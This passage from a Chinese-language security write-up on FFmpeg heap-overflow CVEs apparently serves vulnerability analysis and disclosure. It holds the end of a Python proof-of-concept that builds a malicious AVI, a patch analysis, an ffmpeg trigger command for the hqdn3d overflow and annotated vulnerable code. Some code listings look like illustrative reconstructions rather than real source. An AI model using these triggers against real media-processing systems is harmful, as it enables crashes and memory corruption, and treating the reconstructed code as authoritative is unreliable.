+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    编解码器: MagicYUV (YUV420P)&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    帧尺寸: </span><span class="si">{</span><span class="n">CODED_WIDTH</span><span class="si">}</span><span class="s2">x</span><span class="si">{</span><span class="n">CODED_HEIGHT</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    slice_height: </span><span class="si">{</span><span class="n">SLICE_HEIGHT</span><span class="si">}</span><span class="s2"> (奇数, 触发漏洞)&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    分配器色度行数: 16&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    解码器色度行数: 16/slice x 2 slices = 32 (溢出16行!)&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    触发方法: ffmpeg -i </span><span class="si">{</span><span class="n">output_path</span><span class="si">}</span><span class="s2"> -f null -&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    预期结果: 堆缓冲区溢出 (ASAN报告heap-buffer-overflow)&quot;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">construct_malicious_avi</span><span class="p">(</span><span class="s2">&quot;/tmp/magicyuv_poc.avi&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p><strong>修复补丁分析：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1">// libavcodec/magicyuv.c - 修复补丁 (7行新增)</span>
+
+<span class="w"> </span><span class="c1">// 原有的隔行扫描检查</span>
+<span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">slice_height</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">s</span><span class="o">-&gt;</span><span class="n">slice_height</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">INT_MAX</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">avctx</span><span class="o">-&gt;</span><span class="n">coded_height</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="n">av_log</span><span class="p">(</span><span class="n">avctx</span><span class="p">,</span><span class="w"> </span><span class="n">AV_LOG_ERROR</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;invalid slice height: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="o">-&gt;</span><span class="n">slice_height</span><span class="p">);</span>
+<span class="w">     </span><span class="k">return</span><span class="w"> </span><span class="n">AVERROR_INVALIDDATA</span><span class="p">;</span>
+<span class="w"> </span><span class="p">}</span>
+
+<span class="o">+</span><span class="c1">// 修复: 为非隔行扫描路径也添加对齐检查</span>
+<span class="o">+</span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">slice_height</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">s</span><span class="o">-&gt;</span><span class="n">vshift</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">s</span><span class="o">-&gt;</span><span class="n">interlaced</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="o">+</span><span class="w">    </span><span class="n">av_log</span><span class="p">(</span><span class="n">avctx</span><span class="p">,</span><span class="w"> </span><span class="n">AV_LOG_ERROR</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;impossible slice height</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="o">+</span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">AVERROR_INVALIDDATA</span><span class="p">;</span>
+<span class="o">+</span><span class="p">}</span>
+<span class="o">+</span><span class="c1">// 检查最后一个slice的色度行数是否合理</span>
+<span class="o">+</span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">avctx</span><span class="o">-&gt;</span><span class="n">coded_height</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">s</span><span class="o">-&gt;</span><span class="n">slice_height</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>
+<span class="o">+</span><span class="w">    </span><span class="p">((</span><span class="n">avctx</span><span class="o">-&gt;</span><span class="n">coded_height</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">s</span><span class="o">-&gt;</span><span class="n">slice_height</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">s</span><span class="o">-&gt;</span><span class="n">vshift</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">s</span><span class="o">-&gt;</span><span class="n">interlaced</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="o">+</span><span class="w">    </span><span class="n">av_log</span><span class="p">(</span><span class="n">avctx</span><span class="p">,</span><span class="w"> </span><span class="n">AV_LOG_ERROR</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;impossible height</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="o">+</span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">AVERROR_INVALIDDATA</span><span class="p">;</span>
+<span class="o">+</span><span class="p">}</span>
+</code></pre></div>
+
+<p>补丁的核心逻辑是：对于非隔行扫描路径，也验证<code>slice_height</code>经过色度移位后是否会产生零行或不足的色度行数，从而拒绝会导致溢出的奇数<code>slice_height</code>值。</p>
+<hr />
+<h2>4. CVE-2026-66036：hqdn3d滤镜堆溢出</h2>
+<h3>4.1 漏洞概况</h3>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE编号</td>
+<td>CVE-2026-66036</td>
+</tr>
+<tr>
+<td>CVSS 4.0评分</td>
+<td>7.7 (High)</td>
+</tr>
+<tr>
+<td>CWE分类</td>
+<td>CWE-787 (Out-of-bounds Write)</td>
+</tr>
+<tr>
+<td>影响版本</td>
+<td>FFmpeg &lt;= 8.1.2</td>
+</tr>
+<tr>
+<td>漏洞位置</td>
+<td><code>libavfilter/vf_hqdn3d.c</code></td>
+</tr>
+<tr>
+<td>披露日期</td>
+<td>2026年7月24日 (VulnCheck)</td>
+</tr>
+<tr>
+<td>触发条件</td>
+<td>使用<code>-reinit_filter 0</code>选项</td>
+</tr>
+</tbody>
+</table>
+<h3>4.2 根因分析：帧尺寸变化导致缓冲区不足</h3>
+<p>hqdn3d（High Quality 3D Denoise）是一个高质量3D降噪滤镜。漏洞的核心在于滤镜在初始化时根据第一帧的宽度分配了行历史缓冲区，但当后续帧的分辨率增大时，缓冲区不会重新分配（因为使用了<code>-reinit_filter 0</code>禁用了滤镜重新初始化），导致写入超出缓冲区边界。</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// libavfilter/vf_hqdn3d.c - 漏洞代码分析</span>
+
+<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">HQDN3DContext</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 行历史缓冲区 - 在config_input时根据初始帧宽度分配</span>
+<span class="w">    </span><span class="kt">uint16_t</span><span class="w"> </span><span class="o">*</span><span class="n">line</span><span class="p">;</span><span class="w">         </span><span class="c1">// 降噪用的行缓冲区</span>
+<span class="w">    </span><span class="kt">uint16_t</span><span class="w"> </span><span class="o">**</span><span class="n">frame_prev</span><span class="p">;</span><span class="w">  </span><span class="c1">// 前一帧数据</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">line_size</span><span class="p">;</span><span class="w">          </span><span class="c1">// 行缓冲区大小</span>
+<span class="w">    </span><span class="c1">// ...</span>
+<span class="p">}</span><span class="w"> </span><span class="n">HQDN3DContext</span><span class="p">;</span>
+
+<span class="c1">// config_input: 滤镜初始化，根据输入参数分配缓冲区</span>
+<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">config_input</span><span class="p">(</span><span class="n">AVFilterLink</span><span class="w"> </span><span class="o">*</span><span class="n">inlink</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">HQDN3DContext</span><span class="w"> </span><span class="o">*</span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inlink</span><span class="o">-&gt;</span><span class="n">dst</span><span class="o">-&gt;</span><span class="n">priv</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 根据初始帧宽度分配行历史缓冲区</span>
+<span class="w">    </span><span class="c1">// 漏洞: 只在初始化时分配，后续帧尺寸变化时不重新分配!</span>
+<span class="w">    </span><span class="n">s</span><span class="o">-&gt;</span><span class="n">line_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inlink</span><span class="o">-&gt;</span><span class="n">w</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">uint16_t</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">s</span><span class="o">-&gt;</span><span class="n">line</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">av_calloc</span><span class="p">(</span><span class="n">inlink</span><span class="o">-&gt;</span><span class="n">w</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">uint16_t</span><span class="p">));</span>
+<span class="w">        </span><span class="c1">// 分配大小基于初始帧宽度 inlink-&gt;w</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// denoise_spatial: 空间降噪函数</span>
+<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">denoise_spatial</span><span class="p">(</span><span class="n">HQDN3DContext</span><span class="w"> </span><span class="o">*</span><span class="n">s</span><span class="p">,</span>
+<span class="w">                            </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">src</span><span class="p">,</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">dst</span><span class="p">,</span>
+<span class="w">                            </span><span class="kt">uint16_t</span><span class="w"> </span><span class="o">*</span><span class="n">line_ant</span><span class="p">,</span><span class="w"> </span><span class="kt">uint16_t</span><span class="w"> </span><span class="o">*</span><span class="n">frame_ant</span><span class="p">,</span>
+<span class="w">                            </span><span class="kt">int</span><span class="w"> </span><span class="n">w</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">h</span><span class="p">,</span><span class="w">  </span><span class="c1">// w和h来自当前帧!</span>
+<span class="w">                            </span><span class="kt">int</span><span class="w"> </span><span class="n">sstride</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">dstride</span><span class="p">,</span>
+<span class="w">                            </span><span class="kt">int</span><span class="w"> </span><span class="n">depth</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="c1">// w来自当前帧的宽度</span>
+<span class="w">    </span><span class="c1">// 但line_ant缓冲区是基于初始帧宽度分配的!</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">y</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">h</span><span class="p">;</span><span class="w"> </span><span class="n">y</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">w</span><span class="p">;</span><span class="w"> </span><span class="n">x</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 当w &gt; 初始帧宽度时，line_ant[x]越界!</span>
+<span class="w">            </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">pixel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">line_ant</span><span class="p">[</span><span class="n">x</span><span class="p">];</span><span class="w">  </span><span class="c1">// OOB READ</span>
+<span class="w">            </span><span class="c1">// ... 降噪计算 ...</span>
+<span class="w">            </span><span class="n">line_ant</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dst_val</span><span class="p">;</span><span class="w">  </span><span class="c1">// OOB WRITE (如果w更大)!</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// 漏洞触发条件:</span>
+<span class="c1">// 1. 使用 -reinit_filter 0 禁用滤镜重新初始化</span>
+<span class="c1">// 2. 视频第一帧宽度较小 (如640)</span>
+<span class="c1">// 3. 后续帧宽度增大 (如1920)</span>
+<span class="c1">// 4. denoise_spatial 使用新宽度访问旧缓冲区 → 堆溢出</span>
+</code></pre></div>
+
+<p><strong>触发命令：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 构造一个帧尺寸变化的视频触发漏洞</span>
+<span class="c1"># 第一帧: 640x480 (小尺寸，分配小缓冲区)</span>
+<span class="c1"># 后续帧: 1920x1080 (大尺寸，超出缓冲区)</span>
+
+<span class="c1"># 使用-reinit_filter 0禁用滤镜重新初始化</span>
+ffmpeg<span class="w"> </span>-reinit_filter<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-i<span class="w"> </span>malicious_variable_resolution.mp4<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-vf<span class="w"> </span>hqdn3d<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-f<span class="w"> </span>null<span class="w"> </span>-
+
+<span class="c1"># 结果: denoise_spatial()写入超出line缓冲区 → 堆溢出</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="err">┌──────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">           </span><span class="n">CVE</span><span class="o">-</span><span class="mi">2026</span><span class="o">-</span><span class="mi">66036</span><span class="err">:</span><span class="w"> </span><span class="n">帧尺寸变化导致堆溢出</span><span class="w">                    </span><span class="err">│</span>
+<span class="err">├──────────────────────────────────────────────────────────────────┤</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">初始帧</span><span class="w"> </span><span class="p">(</span><span class="n">Frame</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="mi">640</span><span class="n">x480</span><span class="w">                                     </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌──────────────────────────────────────┐</span><span class="w">                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">config_input</span><span class="p">()</span><span class="w"> </span><span class="nl">被调用</span><span class="p">:</span><span class="w">               </span><span class="err">│</span><span class="w">                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="n">line缓冲区</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">av_calloc</span><span class="p">(</span><span class="mi">640</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span><span class="w">   </span><span class="err">│</span><span class="w">                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="n">line_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">640</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">sizeof</span><span class="p">(</span><span class="n">uint16_t</span><span class="p">)</span><span class="w"> </span><span class="err">│</span><span class="w">                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="nl">有效索引</span><span class="p">:</span><span class="w"> </span><span class="mf">0..639</span><span class="w">                   </span><span class="err">│</span><span class="w">                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└──────────────────────────────────────┘</span><span class="w">                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">第二帧</span><span class="w"> </span><span class="p">(</span><span class="n">Frame</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="mi">1920</span><span class="n">x1080</span><span class="w">                                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌──────────────────────────────────────────┐</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="o">-</span><span class="n">reinit_filter</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">滤镜不重新初始化</span><span class="w">      </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">line缓冲区仍然只有640个元素</span><span class="w">               </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">                                           </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">denoise_spatial</span><span class="p">(</span><span class="n">w</span><span class="o">=</span><span class="mi">1920</span><span class="p">,</span><span class="w"> </span><span class="n">h</span><span class="o">=</span><span class="mi">1080</span><span class="p">)</span><span class="err">:</span><span class="w">         </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="k">for</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">0..1919</span><span class="err">:</span><span class="w">                      </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">     </span><span class="n">line_ant</span><span class="o">[</span><span class="n">x</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">...</span><span class="w">  </span><span class="err">←</span><span class="w"> </span><span class="n">x</span><span class="o">=</span><span class="mi">640</span><span class="n">时越界</span><span class="err">!</span><span class="w">    </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">                         </span><span class="n">x</span><span class="o">=</span><span class="mf">641..1919</span><span class="w">      </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">                         </span><span class="n">全部堆溢出</span><span class="err">!</span><span class="w">       </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└──────────────────────────────────────────┘</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nl">堆布局</span><span class="p">:</span><span class="w">                                                         </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌──────────┐</span><span class="w">  </span><span class="err">┌──────────────────────────────────┐</span><span class="w">             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">line</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">line</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="n">line</span><span class="o">[</span><span class="n">0</span><span class="o">]+</span><span class="mi">640</span><span class="o">*</span><span class="mi">2</span><span class="n">字节之后</span><span class="p">)</span><span class="w">   </span><span class="err">│</span><span class="w">             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="mi">640</span><span class="n">个</span><span class="w">    </span><span class="err">│</span><span class="o">-&gt;</span><span class="err">│</span><span class="w"> </span><span class="n">被溢出数据覆盖</span><span class="w">                    </span><span class="err">│</span><span class="w">             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">uint16_t</span><span class="w"> </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">                                    </span><span class="err">│</span><span class="w">             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└──────────┘</span><span class="w">  </span><span class="err">└──────────────────────────────────┘</span><span class="w">             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="mf">0..639</span><span class="w"> </span><span class="p">(</span><span class="n">安全</span><span class="p">)</span><span class="w">   </span><span class="mf">640..1919</span><span class="w"> </span><span class="p">(</span><span class="n">溢出</span><span class="err">!</span><span class="w"> </span><span class="mi">2560</span><span class="n">字节越界写</span><span class="p">)</span><span class="w">               </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">└──────────────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<hr />
+<h2>5. CVE-2026-66039：MACE6音频解码器有符号整数溢出</h2>
+<h3>5.1 漏洞概况</h3>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE编号</td>
+<td>CVE-2026-66039</td>
+</tr>
+<tr>
+<td>CVSS 4.0评分</td>
+<td>8.7 (High)</td>
+</tr>
+<tr>
+<td>CWE分类</td>
+<td>CWE-196 (Signed Integer Overflow) + CWE-787 (OOB Write)</td>
+</tr>
+<tr>
+<td>影响版本</td>
+<td>FFmpeg &lt;= 8.1.2</td>
+</tr>
+<tr>
+<td>漏洞位置</td>
+<td><code>libavcodec/mace6.c</code></td>
+</tr>
+<tr>
+<td>披露日期</td>
+<td>2026年7月24日 (VulnCheck)</td>
+</tr>
+<tr>
+<td>触发文件</td>
+<td>恶意CAF (Core Audio Format) 文件</td>
+</tr>
+</tbody>
+</table>
+<h3>5.2 根因分析：采样计数计算溢出</h3>
+<p>MACE6（Macintosh Audio Compression/Expansion 6:1）是Apple的音频压缩格式。漏洞在于解码器在计算采样数量时使用了有符号整数运算，攻击者可以通过CAF文件desc chunk中的<code>bytes_per_packet</code>和<code>frames_per_packet</code>字段触发有符号整数溢出，导致分配过小的缓冲区后发生堆越界写。</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// libavcodec/mace6.c - 漏洞代码分析</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">mace_decode_frame</span><span class="p">(</span><span class="n">AVCodecContext</span><span class="w"> </span><span class="o">*</span><span class="n">avctx</span><span class="p">,</span><span class="w"> </span><span class="n">AVFrame</span><span class="w"> </span><span class="o">*</span><span class="n">frame</span><span class="p">,</span>
+<span class="w">                              </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">got_frame_ptr</span><span class="p">,</span><span class="w"> </span><span class="n">AVPacket</span><span class="w"> </span><span class="o">*</span><span class="n">avpkt</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="c1">// 从编解码器参数中获取值 (攻击者通过CAF文件控制)</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">bytes_per_packet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">avctx</span><span class="o">-&gt;</span><span class="n">block_align</span><span class="p">;</span><span class="w">  </span><span class="c1">// 来自CAF desc chunk</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">frames_per_packet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">avctx</span><span class="o">-&gt;</span><span class="n">frame_size</span><span class="p">;</span><span class="w">  </span><span class="c1">// 来自CAF desc chunk</span>
+
+<span class="w">    </span><span class="c1">// 漏洞: 有符号整数乘法溢出!</span>
+<span class="w">    </span><span class="c1">// 当 bytes_per_packet * frames_per_packet &gt; INT_MAX 时溢出</span>
+<span class="w">    </span><span class="c1">// 例如: bytes_per_packet = 0x10000, frames_per_packet = 0x10000</span>
+<span class="w">    </span><span class="c1">// 0x10000 * 0x10000 = 0x100000000 → 截断为32位有符号: 0 (或负数!)</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">sample_count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bytes_per_packet</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">frames_per_packet</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// sample_count溢出为很小的正数或负数</span>
+<span class="w">    </span><span class="c1">// 如果为负数，下面的av_mallocz会处理为很大的无符号值(可能失败)</span>
+<span class="w">    </span><span class="c1">// 如果为小的正数(如0)，则分配极小的缓冲区</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sample_count</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 某些溢出情况sample_count变为0或负数</span>
+<span class="w">        </span><span class="c1">// 如果代码没有正确处理这种情况...</span>
+<span class="w">        </span><span class="n">sample_count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">abs</span><span class="p">(</span><span class="n">sample_count</span><span class="p">);</span><span class="w">  </span><span class="c1">// 可能让负数变成大正数</span>
+<span class="w">        </span><span class="c1">// 或者直接使用，导致问题</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 分配输出缓冲区</span>
+<span class="w">    </span><span class="c1">// 如果sample_count因溢出变小，缓冲区过小</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">channels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">avctx</span><span class="o">-&gt;</span><span class="n">ch_layout</span><span class="p">.</span><span class="n">nb_channels</span><span class="p">;</span>
+<span class="w">    </span><span class="n">frame</span><span class="o">-&gt;</span><span class="n">nb_samples</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sample_count</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">channels</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 分配基于溢出后的小sample_count</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">frame</span><span class="o">-&gt;</span><span class="n">nb_samples</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">AVERROR_INVALIDDATA</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">buf_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">frame</span><span class="o">-&gt;</span><span class="n">nb_samples</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">channels</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int16_t</span><span class="p">);</span>
+<span class="w">    </span><span class="kt">int16_t</span><span class="w"> </span><span class="o">*</span><span class="n">samples</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int16_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">frame</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+<span class="w">    </span><span class="c1">// 实际解码循环使用原始的bytes_per_packet</span>
+<span class="w">    </span><span class="c1">// 向过小的缓冲区写入大量数据 → 堆溢出!</span>
